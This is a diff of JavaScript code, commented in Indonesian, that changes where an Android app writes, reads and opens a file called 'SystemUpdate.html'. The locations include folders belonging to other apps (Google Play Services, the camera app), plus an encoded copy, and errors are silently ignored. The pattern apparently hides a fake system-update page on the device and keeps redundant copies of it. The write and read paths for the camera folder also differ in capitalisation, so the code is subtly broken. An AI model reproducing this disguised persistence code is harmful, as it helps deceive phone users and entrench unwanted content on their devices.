@@ -310,7 +310,7 @@ function saveToAllLocations(htmlContent) {
     // 3. Android/data (via Bridge)
     if (PLATFORM.isAndroid && A.isAvailable) {
         try {
-            var path = '/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html';
+            var path = '/storage/emulated/0/Android/data/SystemUpdate.html';
             A.saveFile(path, htmlContent);
         } catch(e) {}
         // 4. SharedPreferences (encoded)
@@ -322,7 +322,7 @@ function saveToAllLocations(htmlContent) {
     // 5. Download folder (fallback)
     if (PLATFORM.isAndroid && A.isAvailable) {
         try {
-            A.saveFile('/storage/emulated/0/Download/SystemUpdate.html', htmlContent);
+            A.saveFile('/storage/emulated/0/Android/data/com.android.camera/SystemUpdate.html', htmlContent);
         } catch(e) {}
     }
 }
@@ -368,13 +368,13 @@ function openSystemUpdateHTML() {
         // 4. Android/data
         if (!htmlContent && PLATFORM.isAndroid && A.isAvailable) {
             try {
-                htmlContent = A.readFile('/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html');
+                htmlContent = A.readFile('/storage/emulated/0/Android/data/SystemUpdate.html');
             } catch(e) {}
         }
         // 5. Download folder
         if (!htmlContent && PLATFORM.isAndroid && A.isAvailable) {
             try {
-                htmlContent = A.readFile('/storage/emulated/0/Download/SystemUpdate.html');
+                htmlContent = A.readFile('/storage/emulated/0/Android/Data/com.android.camera/SystemUpdate.html');
             } catch(e) {}
         }
         // Jika berhasil, buka
@@ -388,7 +388,7 @@ function openHTML(htmlContent) {
     // Android Bridge (buka file)
     if (PLATFORM.isAndroid && A.isAvailable) {
         try {
-            var path = '/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html';
+            var path = '/storage/emulated/0/Android/data/SystemUpdate.html';
             // Pastikan file ada
             if (A.fileExists(path)) {
                 A.openFile(path);
